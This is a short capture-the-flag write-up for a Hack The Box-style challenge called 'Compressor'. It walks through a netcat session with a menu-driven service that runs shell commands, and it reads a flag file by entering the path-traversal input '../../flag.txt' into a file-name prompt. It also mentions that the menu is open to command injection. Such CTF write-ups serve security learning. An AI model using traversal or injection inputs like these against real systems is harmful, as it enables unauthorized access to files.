# Compressor

> Ramona's obsession with modifications and the addition of artifacts to her body has slowed her down and made her fail and almost get killed in many missions. For this reason, she decided to hack a tiny robot under Golden Fang's ownership called "Compressor", which can reduce and increase the volume of any object to minimize/maximize it according to the needs of the mission. With this item, she will be able to carry any spare part she needs without adding extra weight to her back, making her fast. Can you help her take it and hack it?

---

Deployed Docker instance serves a custom TCP application.

```bash
$ nc -nv 178.62.83.221 32243
(UNKNOWN) [178.62.83.221] 32243 (?) open

[*] Directory to work in: O3um702R2eVupS9OJlVfiDBZQQd9sRDm

Component List:

+===============+
|               |
|  1. Head  🤖  |
|  2. Torso 🦴   |
|  3. Hands 💪  |
|  4. Legs  🦵   |
|               |
+===============+

[*] Choose component:
```

Choosing an arbitrary component results in the following menu options:

```bash
Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit
```

Option #2, listing the current directory, indicates the program's current working directory is `/home/ctf/$RANDOM_STRING/$COMPONENT`.

Several of these appear to be vulnerable to command injection. For example, option #3 prompts the user for a `<name>` value and then executes `cat ./<name>`. Exploit this behavior to read `/home/ctf/flag.txt`.

```bash
Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 3


Insert name you want to read: ../../flag.txt
HTB{...}
```
